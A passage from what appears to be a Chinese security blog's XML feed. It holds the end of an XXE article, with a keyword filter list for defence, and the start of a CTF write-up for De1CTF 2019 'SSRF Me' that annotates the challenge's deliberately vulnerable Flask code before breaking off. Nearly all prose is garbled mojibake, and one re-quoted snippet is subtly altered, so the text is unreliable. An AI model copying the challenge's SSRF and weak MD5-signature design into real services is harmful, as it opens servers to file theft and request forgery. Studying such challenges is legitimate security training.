variable">$path</span>/file.txtï¼›http://url/file.txtï¼›<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="ä¸ƒã€XXEçš„é˜²å¾¡"><a href="#ä¸ƒã€XXEçš„é˜²å¾¡" class="headerlink" title="ä¸ƒã€XXEçš„é˜²å¾¡"></a>ä¸ƒã€XXEçš„é˜²å¾¡</h1><p>æ–¹æ¡ˆä¸€ï¼šä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•ï¼ˆXMLè§£æåº“åœ¨è°ƒç”¨æ—¶ä¸¥æ ¼ç¦æ­¢å¯¹å¤–éƒ¨å®ä½“çš„è§£æï¼‰</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212165001547.png" style="zoom:60%;"><p>æ–¹æ¡ˆäºŒï¼šè¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">å…³é”®è¯ï¼š<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE  å’Œ  <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY  æˆ–è€…  SYSTEM å’Œ PUBLICã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>XXEæ¼æ´æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨å¤„ç†XMLæ•°æ®çš„åº”ç”¨ç¨‹åºä¸­æ³¨å…¥å¤–éƒ¨å®ä½“å¼•ç”¨ã€‚è¿™ç§æ¼æ´å¯ä»¥å¯¼è‡´æ•æ„Ÿæ•°æ®æ³„éœ²ã€æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆSSRFï¼‰ã€æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼‰ç­‰å®‰å…¨é—®é¢˜ï¼Œå› ä¸ºå®ƒå¯èƒ½å…è®¸æ”»å‡»è€…è¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€ä¸è¿œç¨‹æœåŠ¡å™¨äº¤äº’æˆ–æ¶ˆè€—æœåŠ¡å™¨èµ„æºã€‚XXEæ¼æ´é€šå¸¸å‡ºç°åœ¨ä½¿ç”¨XMLè§£æåº“çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå½“è¿™äº›åº“æ²¡æœ‰æ­£ç¡®é…ç½®ä»¥ç¦ç”¨å¤–éƒ¨å®ä½“è§£ææ—¶ã€‚ä¸ºäº†é˜²æ­¢XXEæ”»å‡»ï¼Œå¼€å‘è€…éœ€è¦ç¡®ä¿ç¦ç”¨å¤–éƒ¨å®ä½“çš„è§£æï¼Œå¹¶å¯¹è¾“å…¥è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œæ¸…ç†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-([De1CTF 2019]SSRF Me)</title>
      <link href="/2025/02/12/ctf-shi-zhan/web-buuoj-de1ctf-2019-ssrf-me/"/>
      <url>/2025/02/12/ctf-shi-zhan/web-buuoj-de1ctf-2019-ssrf-me/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h1><img src="/2025/02/12/ctf-shi-zhan/web-buuoj-de1ctf-2019-ssrf-me/image-20250211204545373.png" style="zoom:60%;"><p>æç¤ºï¼š</p><img src="/2025/02/12/ctf-shi-zhan/web-buuoj-de1ctf-2019-ssrf-me/image-20250211212318057.png" style="zoom:80%;"><p>æç¤ºflagåœ¨å½“å‰ç›®å½•ä¸‹çš„flag.txtä¸­ã€‚</p><img src="/2025/02/12/ctf-shi-zhan/web-buuoj-de1ctf-2019-ssrf-me/image-20250211204735781.png" style="zoom:80%;"><p>è®¿é—®é¡µé¢é»˜è®¤è¿”å›çš„æ˜¯ä¸€æ®µpythonä»£ç ï¼Œéœ€è¦è¿›è¡Œä¸€ä¸‹ä»£ç å®¡è®¡ã€‚</p><h1 id="äºŒã€åˆ†æ"><a href="#äºŒã€åˆ†æ" class="headerlink" title="äºŒã€åˆ†æ"></a>äºŒã€åˆ†æ</h1><h2 id="2-1-ä»£ç å®¡è®¡"><a href="#2-1-ä»£ç å®¡è®¡" class="headerlink" title="2.1 ä»£ç å®¡è®¡"></a>2.1 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># encoding=utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> urllib<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>                <span class="token keyword">if</span> resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">:</span>                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>            <span class="token keyword">elif</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span> waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span><span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secret_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    check <span class="token operator">=</span> param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="ä»£ç åˆ†æï¼š"><a href="#ä»£ç åˆ†æï¼š" class="headerlink" title="ä»£ç åˆ†æï¼š"></a>ä»£ç åˆ†æï¼š</h4><p>è¿™æ®µä»£ç å®ç°äº†ä¸€ä¸ªç®€å•çš„ Web æœåŠ¡ï¼Œç”¨äºå¤„ç†ç½‘ç»œæ‰«æä»»åŠ¡å’Œæ–‡ä»¶è¯»å–ä»»åŠ¡ã€‚å®ƒé€šè¿‡ç­¾åéªŒè¯å’Œç®€å•çš„ WAF æ£€æŸ¥æ¥å¢å¼ºå®‰å…¨æ€§ã€‚</p><ol><li><strong>å¯¼å…¥æ¨¡å—</strong></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">import</span> socket<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> urllib<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>å¯¼å…¥äº† Flask æ¡†æ¶ç”¨äºåˆ›å»º Web åº”ç”¨ã€‚</li><li>å¯¼å…¥äº† <code>socket</code>ã€<code>hashlib</code>ã€<code>urllib</code> ç­‰æ¨¡å—ç”¨äºç½‘ç»œè¯·æ±‚ã€å“ˆå¸Œè®¡ç®—ç­‰æ“ä½œã€‚</li><li><code>sys</code> å’Œ <code>os</code> ç”¨äºç³»ç»Ÿç›¸å…³çš„æ“ä½œã€‚</li><li><code>json</code> ç”¨äºå¤„ç† JSON æ•°æ®ã€‚</li></ul><ol start="2"><li><strong>è®¾ç½®ç¼–ç </strong></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>è¿™æ˜¯ä¸ºäº†å…¼å®¹ Python 2.x çš„ç¼–ç é—®é¢˜ã€‚åœ¨ Python 3.x ä¸­ï¼Œè¿™è¡Œä»£ç æ˜¯ä¸å¿…è¦çš„ã€‚</li></ul><ol start="3"><li><strong>Flask åº”ç”¨åˆå§‹åŒ–</strong></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>åˆ›å»ºäº†ä¸€ä¸ª Flask åº”ç”¨å®ä¾‹ã€‚</li><li>ç”Ÿæˆäº†ä¸€ä¸ªéšæœºçš„ <code>secret_key</code>ï¼Œç”¨äºç­¾åéªŒè¯ã€‚</li></ul><ol start="4"><li><strong>Task ç±»</strong></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">:</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>Task</code> ç±»ç”¨äºå¤„ç†ä»»åŠ¡ã€‚</li><li>åˆå§‹åŒ–æ—¶ï¼Œæ ¹æ® IP åœ°å€ç”Ÿæˆä¸€ä¸ªæ²™ç®±ç›®å½•ã€‚</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>            tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>            <span class="token keyword">if</span> resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">:</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>        <span class="token keyword">elif</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>            f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>            result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>        result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>    <span class="token keyword">return</span> result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>Exec</code> æ–¹æ³•æ ¹æ® <code>action</code> æ‰§è¡Œä¸åŒçš„ä»»åŠ¡ï¼š</p><ul><li>å¦‚æœ <code>action</code> åŒ…å« â€œscanâ€ï¼Œåˆ™è°ƒç”¨ <code>scan</code> å‡½æ•°è·å–æ•°æ®å¹¶å†™å…¥æ–‡ä»¶ã€‚</li><li>å¦‚æœ <code>action</code> åŒ…å« â€œreadâ€ï¼Œåˆ™è¯»å–æ–‡ä»¶å†…å®¹ã€‚</li></ul><p>â€‹          ï¼ˆè¿™é‡Œæœ‰ä¸ªç‚¹ï¼Œå¦‚æœæ—¢åŒ…å«scanåˆåŒ…å«readï¼Œé‚£ä¹ˆä¸¤ä¸ªåˆ†æ”¯éƒ½ä¼šæ‰§è¡Œã€‚ï¼‰</p></li><li><p>å¦‚æœéªŒè¯ç­¾åå¤±è´¥ï¼Œè¿”å›é”™è¯¯ä¿¡æ¯ã€‚</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>checkSign</code> æ–¹æ³•ç”¨äºéªŒè¯ç­¾åæ˜¯å¦æ­£ç¡®ã€‚</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secret_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><code>getSign</code> å‡½æ•°ç”¨äºç”Ÿæˆç­¾åã€‚</li></ul><ol start="5"><li><strong>è·¯ç”±å’Œè§†å›¾å‡½æ•°</strong></li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>request.args.get("param", "")</code>ï¼š</p><ul><li>å°è¯•ä» <code>request.args</code> ä¸­è·å–åä¸º <code>param</code> çš„å‚æ•°ã€‚</li><li>å¦‚æœ <code>param</code> å‚æ•°å­˜åœ¨ï¼Œåˆ™è¿”å›å…¶å€¼ã€‚</li><li>å¦‚æœ <code>param</code> å‚æ•°ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›é»˜è®¤å€¼ <code>""</code>ï¼ˆç©ºå­—ç¬¦ä¸²ï¼‰ã€‚</li></ul></li><li><p><code>urllib.unquote</code> æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå¯¹ URL ç¼–ç çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚</p></li><li><p><code>/geneSign</code> è·¯ç”±ç”¨äºç”Ÿæˆç­¾åã€‚</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token 